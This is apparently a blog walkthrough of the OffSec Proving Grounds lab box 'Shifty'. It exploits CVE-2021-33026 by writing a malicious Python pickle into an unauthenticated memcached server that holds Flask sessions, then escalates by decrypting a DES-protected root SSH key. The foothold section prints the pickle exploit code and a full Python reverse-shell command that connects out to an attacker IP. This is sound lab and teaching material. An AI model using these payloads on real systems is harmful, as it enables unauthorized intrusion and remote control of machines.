---
title: "PG: Shifty"
date: 2023-03-07
draft: false
os: "Linux"
difficulty: "Hard"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/shifty/"]
tags:
  - offsec
  - proving-grounds
  - hard
  - linux
  - memcached
  - pickle-deserialization
  - cve-2021-33026
  - flask
  - des
categories:
  - walkthrough
---

{{< box-info name="Shifty" os="Linux" difficulty="Hard" ip="192.168.244.59" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
80/tcp    open  http      nginx 1.10.3
5000/tcp  open  http      Werkzeug httpd 1.0.1 (Python 3.5.3)
11211/tcp open  memcached Memcached 1.4.33 (uptime 388 seconds)
```
{{< /collapse >}}

Four ports, but two of them talk to each other. Port 5000 is a Flask app (Werkzeug/Python), and port 11211 is memcached — sitting wide open with no auth. That pairing is the whole box.

### Port 5000 - Flask App

The app has a login form, and the stock `admin:admin` gets you in. Logging in and out while watching memcached shows session keys popping in and out of the cache:

```
session:2ddbaeff-f2ff-4256-8f7a-d516c346cd67
```

That exact string is also your session cookie in the browser. The app is storing server-side sessions in memcached, keyed by the cookie value — and the stored blob is a **Python pickle**. You can watch it in the login request:

![Burp login request showing the session cookie and admin/admin credentials](/images/shifty/session-cookie.png)

### Port 11211 - Memcached

Memcached 1.4.33 has public exploits, but none of them are the way in here. What matters is that it's unauthenticated *and* it holds pickled Flask sessions. When Flask reads your session, it fetches the value for your cookie key from memcached and calls `pickle.loads()` on it. Control the value, control the deserialization.

---

## Foothold

### Pickle Deserialization via Memcached Poisoning — CVE-2021-33026

Unauthenticated memcached + a Flask app that unpickles whatever is stored under the session key = remote code execution. Overwrite the cache entry for your own cookie with a malicious pickle whose `__reduce__` returns `os.system(cmd)`, then send a request with that cookie to trigger the `pickle.loads()`.

Public PoC: [CarlosG13/CVE-2021-33026](https://github.com/CarlosG13/CVE-2021-33026). The core of it is trivial:

```python
class rce_payload:
    def __reduce__(self):
        return (os.system, (cmd,))

pickled = pickle.dumps(rce_payload())
client = base.Client((rhost, 11211))
client.set(cookie, pickled)          # poison the session key
requests.get(f"http://{rhost}:5000", cookies=cookie_dict)  # trigger the unpickle
```

Grab a live session cookie from the app, start a listener, and fire the exploit with a reverse shell as the command:

```bash
python3 cve-2021-33026_PoC.py \
  --rhost 192.168.244.59 \
  --cmd 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.5\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"' \
  --cookie "session:2ddbaeff-f2ff-4256-8f7a-d516c346cd67"
```

Shell lands as **jerry**, and `local.txt` is right there in the home directory:

![Shell as jerry reading local.txt](/images/shifty/user-flag.png)

---

## Privilege Escalation

### DES Backup Script — Reverse the Cipher, Recover Root's Key

Poking around from jerry's shell, `/opt/backups/` stands out. It holds a Python script (`backup.py`) and a `data/` directory of encrypted output. Reading the script shows it **DES-encrypts** files into `data/` — and because it's symmetric with a hardcoded key, the same script decrypts them.

Pull the whole `backups/` directory back to your box, flip the operation in the script from encrypt to decrypt, and run it against the blobs in `data/`:

```bash
# in backup.py — swap the DES call
# des.encrypt(...)  ->  des.decrypt(...)
python3 backup.py
```

Out falls **root's SSH private key**. From there it's a one-liner:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@192.168.244.59
```

Root.

---

## Proof

![Root proof — hostname shifty, whoami root, and /root/proof.txt](/images/shifty/proof.png)

---

## Key Takeaways

{{< callout type="note" >}}
- An **unauthenticated memcached** paired with an app that stores serialized sessions there is a code-execution primitive — poison the session key with a malicious pickle and let the app deserialize it (CVE-2021-33026).
- When a session cookie shows up verbatim as a cache key, the server is trusting the cache blindly. Watch what appears in memcached as you log in and out.
- Symmetric backup/encryption scripts left on disk are a gift: if the script can encrypt, it can decrypt. Reverse the operation instead of attacking the cipher.
- DES with a hardcoded key protecting an SSH private key is not protection — it's a speed bump.
{{< /callout >}}
